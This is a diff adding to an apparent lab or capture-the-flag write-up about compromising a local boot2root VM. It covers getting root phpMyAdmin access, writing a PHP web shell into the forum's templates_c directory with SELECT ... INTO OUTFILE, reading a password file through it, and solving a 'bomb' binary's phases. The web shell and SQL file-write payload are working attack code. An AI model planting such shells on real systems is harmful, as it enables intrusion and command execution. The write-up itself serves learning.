@@ -77,3 +77,85 @@ Best regards.
 so we now know how to connect to the db. We check if there is a phpmyadmin running and there is one and we can connect as root to it.
 
 Connecting as root to the db is not the end though.
+
+With select, we can create a new php page that would take an input as argument and show us the result :
+
+```php
+<?php
+if (isset($_GET['command'])) {
+    echo "<pre>" . shell_exec($_GET['command']) . "</pre>";
+}
+?>
+```
+
+SELECT "<?php if (isset($_GET['command'])) {echo '<pre>' . shell_exec($_GET['command']) . '</pre>';}?>" INTO OUTFILE "/var/www/forum/templates_c/test.php"
+
+Searching through the file system we found /home/LOOKATME/password with this inside
+
+https://192.168.56.105/forum/templates_c/test3.php?command=cat%20/home/LOOKATME/password
+
+lmezard:G!@M6f4Eatau{sF"
+
+now we try to connect in ssh, doesn't work
+
+we try to connect to ftp, it works
+
+we get a fun file that is a tarball, after using tar -xpf on it we get a ft_fun folder, which contains 750 files with each one line of a c code and the order they have to be put in, so we use a small python script to get the code in the right order, remove all the useless comments and we get a c code, and when we compile and run it, we get 
+
+MY PASSWORD IS: Iheartpwnage
+Now SHA-256 it and submit
+
+so we do exactly that, we sha-256 it and try to connect to ssh
+
+hash : 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+
+in the ftp we also had a README file that contained
+
+Complete this little challenge and use the result as password for user 'laurie' to login in ssh
+
+so we connect with user 'laurie' in ssh
+
+In the home, we have a readme and a 'bomb' executable
+
+because we are very smart, we execute the bomb, it is an executable that waits for 6 password and if we don't have them correct, it explodes and just returns
+
+the readme is an int saying
+
+```
+Diffuse this bomb!
+When you have all the password use it as "thor" user with ssh.
+
+HINT:
+P
+ 2
+ b
+
+o
+4
+
+NO SPACE IN THE PASSWORD (password is case sensitive).
+```
+
+because we did rainfall and override before this, we will reverse engineer the binary to get the passwords easily
+
+now we have to defuse the bomb by getting the 6 passwords.
+
+The first one is easy and just strcmp on "Public speaking is very easy." so we just enter it.
+
+After that, we get a small math check that multiplies things in weird way in a loop, answer is easy to understand :
+
+1 2 6 24 120 720
+
+Third one gets an int, a char and an other int at the end then enters a switch statement, the first one is the case where the first int is 0, requires the char to be q and second int to be 777 so we enter that:
+
+0 q 777
+
+Fourth one gets an int, passes it through a fibonacci sequence and compares the result to 55 so we need to input the index of 55 in the fibonacci sequence:
+
+9
+
+Fifth phase is encrypting the string we give it and compares the output with "giants", we simply reverse it and check which characters we have to input to get the right output with a small python script
+
+opekmq
+
+Phase 6 is ennoying, doing it later, bye
